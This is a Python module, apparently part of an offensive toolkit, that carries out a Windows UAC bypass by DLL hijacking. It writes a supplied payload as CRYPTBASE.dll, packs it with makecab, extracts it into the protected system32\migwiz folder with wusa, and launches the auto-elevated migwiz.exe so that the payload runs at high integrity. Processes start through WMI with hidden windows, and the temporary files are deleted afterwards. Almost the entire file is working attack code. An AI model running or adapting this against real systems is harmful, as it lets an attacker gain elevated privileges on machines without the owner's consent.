import os
import wmi
import time
import tempfile
from core.prints import *

wmi = wmi.WMI()

def system_directory():
	for os in wmi.Win32_OperatingSystem():
		return os.SystemDirectory

def migwiz(payload):
	print """
 -------------------------------------------------------------
 migwiz.exe is an auto-elevated binary that attempts to
 load dll files which is not present in migwiz folder. By 
 placing our own dll file in migwiz directory will make the
 application load our evil dll file
 
 When everything worked correctly, the payload should be
 spawned with high IL.
 -------------------------------------------------------------
 """

	"""
	Save the DLL file to temp directory
	"""
	print_info("Payload: {}".format(payload))
	print_info("Attempting to read payload data")
	if (os.path.isfile(os.path.join(payload)) == True):
		try:
			payload_data = open(os.path.join(payload),"rb").read()
		except Exception as error:
			print_error("Unable to read payload data")
			return False
		else:
			print_success("Successfully read payload data")
		
		print_info("Attempting to save payload to: {}".format(tempfile.gettempdir()))
		try:
			dll_file = open(os.path.join(tempfile.gettempdir(),"CRYPTBASE.dll"),"wb")
			dll_file.write(payload_data)
			dll_file.close()
		except Exception as error:
			print_error("Unable to save payload to disk")
			return False
		else:
			print_success("Successfully saved payload in: {}".format(tempfile.gettempdir()))
	
	print_info("Pausing for 5 seconds before creating cabinet file")
	time.sleep(5)

	"""
	Create a cabinet file that we can use later for
	the DLL drop
	"""
	print_info("Attempting to create cabinet file")
	if (os.path.isfile(os.path.join(tempfile.gettempdir(),"CRYPTBASE.dll")) == True):
		makecab = wmi.Win32_Process.Create(CommandLine="cmd.exe /c makecab {} {}".format(os.path.join(tempfile.gettempdir(),"CRYPTBASE.dll"),
								os.path.join(tempfile.gettempdir(),"suspicious.cab")),
								ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=0))
		
		time.sleep(5)

		if (makecab[1] == 0):
			print_success("Successfully created cabinet file in: {}".format(tempfile.gettempdir()))
			try:
				os.remove(os.path.join(tempfile.gettempdir(),"CRYPTBASE.dll"))
			except Exception as error:
				return False
		else:
			print_error("Unable to create cabinet file")
	else:
		print_error("Unable to create cabinet file, the payload is not present in: {}".format(tempfile.gettempdir()))
	
	print_info("Pausing for 5 seconds before extracting the cabinet file")
	time.sleep(5)

	"""
	We use the built-in feature wusa to extract our DLL file
	into UAC protected folders, this feature was removed in
	Windows 10
	"""
	print_info("Attempting to extract the cabinet file")
	if (os.path.isfile(os.path.join(tempfile.gettempdir(),"suspicious.cab")) == True):
		wusa = wmi.Win32_Process.Create(CommandLine="cmd.exe /c wusa {} /extract:{}\migwiz /quiet".format(os.path.join(tempfile.gettempdir(),"suspicious.cab"),system_directory()),
							ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=0))
		
		time.sleep(5)

		if (wusa[1] == 0):
			print_success("Successfully extracted cabinet file")
			try:
				os.remove(os.path.join(tempfile.gettempdir(),"suspicious.cab"))
			except Exception as error:
				return False
		else:
			print_error("Unable to extract cabinet file")
			return False
	else:
		print_error("Unable to extract cabinet file, the cabinet file is not present in: {}".format(tempfile.gettempdir()))
		return False

	print_info("Pausing for 5 seconds before running migwiz executable")	
	time.sleep(5)
	
	"""
	Run the executable to trigger the DLL
	"""		
	print_info("Attempting to run migwiz executable")
	migwiz = wmi.Win32_Process.Create(CommandLine="cmd.exe /c {}\migwiz\migwiz.exe".format(system_directory()),
							ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=0))
				
	time.sleep(5)

	if (migwiz[1] == 0):
		print_success("Successfully ran migwiz executable")
	else:
		print_error("Unable to run migwiz executable")
		return False
